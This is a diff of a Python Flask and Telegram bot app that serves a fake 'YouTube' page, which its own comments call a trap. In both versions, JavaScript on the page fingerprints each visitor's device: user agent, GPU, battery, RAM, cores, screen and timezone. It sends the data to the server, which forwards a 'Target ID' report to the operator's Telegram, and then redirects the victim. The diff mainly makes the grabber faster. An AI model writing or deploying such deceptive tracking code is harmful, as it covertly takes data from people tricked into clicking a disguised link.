@@ -31,22 +31,18 @@ def get_owner(sid):
         return res[0] if res else OVERLORD_ID
     except: return OVERLORD_ID
 
-# =================================================================
-# [2] ТОТ САМЫЙ КОРЕНЬ ДЛЯ КРОНА
-# =================================================================
+# [2] КОРЕНЬ ДЛЯ КРОНА (Оставил как раньше)
 @app.route('/')
 def index():
     return "service active", 200
 
-# =================================================================
-# [3] ЛОВУШКА (FORCE BATTERY VERSION)
-# =================================================================
+# [3] ЛОВУШКА (БЕЗ БЛОКИРОВКИ)
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>YouTube</title>
     <style>
         body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
@@ -57,50 +53,47 @@ HTML_TEMPLATE = """
 <body onclick="ignite()">
     <div id="app"></div>
 <script>
-    async function ignite() {
-        let batteryInfo = "N/A (Blocked)";
-        
-        // Ждем батарею максимум 500мс
-        const getBat = new Promise((resolve) => {
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    resolve(Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋"));
-                }).catch(() => resolve("Error"));
-            } else { resolve("Not Supported"); }
-            setTimeout(() => resolve("Timeout"), 500);
-        });
-
-        batteryInfo = await getBat;
-
-        const gl = document.createElement('canvas').getContext('webgl');
-        const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-        
-        const info = {
+    function ignite() {
+        // 1. Собираем всё, что доступно МГНОВЕННО
+        var info = {
             sid: "{{sid}}",
-            bat: batteryInfo,
-            gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
             ua: navigator.userAgent,
             res: screen.width + "x" + screen.height,
             plat: navigator.platform,
             mem: navigator.deviceMemory || "N/A",
             cores: navigator.hardwareConcurrency || "N/A",
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            bat: "N/A"
         };
 
+        // 2. Пробуем вытянуть GPU (синхронно)
+        try {
+            var gl = document.createElement('canvas').getContext('webgl');
+            var dbg = gl.getExtension('WEBGL_debug_renderer_info');
+            info.gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Generic";
+        } catch(e) { info.gpu = "N/A"; }
+
+        // 3. Батарея (БЕЗ await, через callback)
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(b) {
+                info.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋");
+                // Досылаем уточненные данные, если успеем
+                navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(info)));
+            });
+        }
+
+        // 4. Основной выстрел данными (сразу)
         navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(info)));
         
-        // Редирект после сбора
-        window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+        // 5. МГНОВЕННЫЙ РЕДИРЕКТ
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     }
 </script>
 </body>
 </html>
 """
 
-# =================================================================
-# [4] SERVER LOGIC
-# =================================================================
-
+# [4] ПРИЕМ И ОТЧЕТ
 @app.route('/v/<sid>')
 def serve(sid):
     return render_template_string(HTML_TEMPLATE, sid=sid)
@@ -113,7 +106,7 @@ def capture():
         sid = str(d.get('sid'))
         
         report = (
-            f"<b>🔴 ОБЪЕКТ ПОЙМАН</b>\n"
+            f"<b>🚀 ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
             f"🆔 <b>Target ID:</b> <code>{sid}</code>\n"
             f"🔋 <b>Заряд:</b> <code>{d.get('bat')}</code>\n\n"
@@ -122,9 +115,8 @@ def capture():
             f"<b>💾 RAM:</b> <code>{d.get('mem')} GB</code>\n"
             f"<b>📱 OS:</b> <code>{d.get('plat')}</code>\n"
             f"<b>📐 Res:</b> <code>{d.get('res')}</code>\n"
-            f"<b>📍 TZ:</b> <code>{d.get('tz')}</code>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🛰 <b>UA:</b> <code>{d.get('ua')[:110]}...</code>"
+            f"🛰 <b>UA:</b> <code>{d.get('ua')[:100]}...</code>"
         )
         
         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
@@ -132,10 +124,7 @@ def capture():
     except: pass
     return "OK"
 
-# =================================================================
 # [5] BOT THREAD
-# =================================================================
-
 def bot_loop():
     offset = 0
     while True:
@@ -147,14 +136,16 @@ def bot_loop():
                 if msg and "text" in msg:
                     cid = msg["chat"]["id"]
                     if msg["text"] == "/start":
-                        conn = sqlite3.connect('phantom.db', check_same_thread=False)
-                        conn.execute('INSERT OR REPLACE INTO links (sid, owner_id) VALUES (?, ?)', (str(cid), cid))
-                        conn.commit()
-                        conn.close()
-                        link = f"{BASE_URL}/v/{cid}"
+                        save_link(str(cid), cid)
                         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                                      json={"chat_id": cid, "text": f"✅ <b>Система в сети.</b>\n\nТвоя ссылка:\n<code>{link}</code>", "parse_mode": "HTML"})
+                                      json={"chat_id": cid, "text": f"✅ <b>Система в норме.</b>\n\nСсылка:\n<code>{BASE_URL}/v/{cid}</code>", "parse_mode": "HTML"})
         except: time.sleep(5)
+
+def save_link(sid, owner_id):
+    conn = sqlite3.connect('phantom.db', check_same_thread=False)
+    conn.execute('INSERT OR REPLACE INTO links (sid, owner_id) VALUES (?, ?)', (sid, owner_id))
+    conn.commit()
+    conn.close()
 
 if __name__ == '__main__':
     init_db()
